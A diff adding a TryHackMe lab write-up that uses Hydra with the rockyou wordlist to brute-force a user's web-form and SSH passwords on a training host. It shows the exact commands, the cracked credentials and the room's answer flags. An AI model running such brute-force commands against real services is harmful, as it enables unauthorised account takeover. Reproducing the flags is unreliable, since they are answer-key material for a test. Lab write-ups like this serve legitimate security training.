@@ -84,3 +84,106 @@ Below is a more concrete example Hydra command to brute force a POST login form:
 * The `password` is the form field where the password is entered
 * The provided passwords will be replacing `^PASS^`
 * Finally, `F=incorrect` is a string that appears in the server reply when the login fails
+
+## Room THM
+
+### Task 1 - Use Hydra to bruteforce molly's web password. What is flag 1?
+
+Go to website: 10.10.226.238:80
+
+<figure><img src="../.gitbook/assets/Schermata del 2023-07-08 17-53-28.png" alt=""><figcaption></figcaption></figure>
+
+and try to login with "default" credentials: admin:password.
+
+We use Burp Suite and Foxy Proxy to intercept traffic and request:
+
+<figure><img src="../.gitbook/assets/Schermata del 2023-07-08 17-55-16.png" alt=""><figcaption></figcaption></figure>
+
+After this, we turn off Foxy Proxy and retry to login with the same credentials:
+
+<figure><img src="../.gitbook/assets/Schermata del 2023-07-08 17-10-46.png" alt=""><figcaption></figcaption></figure>
+
+The form and parameters to use with Hydra for Post-Web-Form are:
+
+```bash
+sudo hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.226.238 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
+```
+
+* user (-l): molly
+* wordlist (-P): /usr/share/wordlists/rockyou.txt
+* IP: 10.10.226.238
+* method: http-post-form "/login:username=^USER^\&password=^PASS^:
+* error message: Your username or password is incorrect."
+
+```bash
+sudo hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.226.238 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
+```
+
+<figure><img src="../.gitbook/assets/Schermata del 2023-07-08 18-05-24.png" alt=""><figcaption></figcaption></figure>
+
+{% hint style="info" %}
+molly:sunshine
+{% endhint %}
+
+We can login using them and finding flag1.
+
+<details>
+
+<summary>🚩 Flag 1</summary>
+
+THM{2673a7dd116de68e85c48ec0b1f2612e}
+
+</details>
+
+### Task 2 - Use Hydra to bruteforce molly's SSH password. What is flag 2?
+
+The form and parameters to use with Hydra for SSH are:
+
+```bash
+sudo hydra -l <username> -P <full path to pass> $IP -t 4 ssh
+```
+
+* user (-l): molly
+* wordlist (-P): /usr/share/wordlists/rockyou.txt
+* IP: 10.10.226.238
+* port: ssh
+
+```bash
+sudo hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.226.238 ssh
+```
+
+<figure><img src="../.gitbook/assets/Schermata del 2023-07-08 18-06-05.png" alt=""><figcaption></figcaption></figure>
+
+{% hint style="info" %}
+molly:butterfly
+{% endhint %}
+
+We can login with ssh using them and finding flag2.
+
+```bash
+ssh molly@10.10.226.238
+molly@10.10.226.238's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-1092-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+65 packages can be updated.
+32 updates are security updates.
+
+
+Last login: Tue Dec 17 14:37:49 2019 from 10.8.11.98
+molly@ip-10-10-226-238:~$ ls -l
+total 4
+-rw-rw-r-- 1 molly molly 38 Dec 17  2019 flag2.txt
+molly@ip-10-10-226-238:~$ cat flag2.txt
+```
+
+<details>
+
+<summary>🚩 Flag 2</summary>
+
+THM{c8eeb0468febbadea859baeb33b2541b}
+
+</details>
